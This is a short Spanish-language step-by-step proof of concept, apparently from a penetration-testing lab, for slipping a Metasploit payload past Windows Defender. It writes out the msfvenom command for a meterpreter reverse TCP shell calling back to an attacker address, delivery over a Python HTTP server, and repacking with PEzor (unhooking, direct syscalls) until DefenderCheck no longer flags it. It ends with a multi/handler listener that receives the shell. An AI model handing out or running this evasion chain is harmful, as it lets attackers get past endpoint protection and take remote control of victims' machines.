## PoC Bypass AV/EDR

1º **Crear payload con MSFVENOM:**

        - msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.xxx.xxx LPORT=3333 -e x86/shikata_ga_nai>

2º **Lo pasamos al windows con un servidor http.

        - python3 -m http.server 8080
        - Nos conecatamos a nuestra ip y descargamos el .exe
        
3º **Lo pasamos por el DefenderCheckMaster (https://github.com/matterpreter/DefenderCheck)

        - cd .\Desktop\DefenderCheck-master\DefenderCheck\DefenderCheck\bin\Debug\
        - .\DefenderCheck.exe C:\Users\OSCP\Downloads\PoC.exe
        -  Se detectará.

4º **Pasamos el .exe por PEzor (https://github.com/phra/PEzor)

        - PEzor -sgn -unhook -syscalls PoC.exe
        - Lo volvemos a enviar al Windows.

5º **Lo volvemos a pasar por el DefenderCheckMaster

        - .\DefenderCheck.exe C:\Users\OSCP\Downloads\PoC.exe.packed.exe
        - NO SE DETECTA

6º **Tendremos a la escucha un listener de mestasploit en nuestra Kali.

        - msfconsole -q
        - use exploit/multi/handler
        - set lhost 192.168.xxx.xxx
        - set lport 3333
        - run

7º **Ejecutamos el .exe

        - Conseguiremos una shell de meterpreter en nuestra kali.

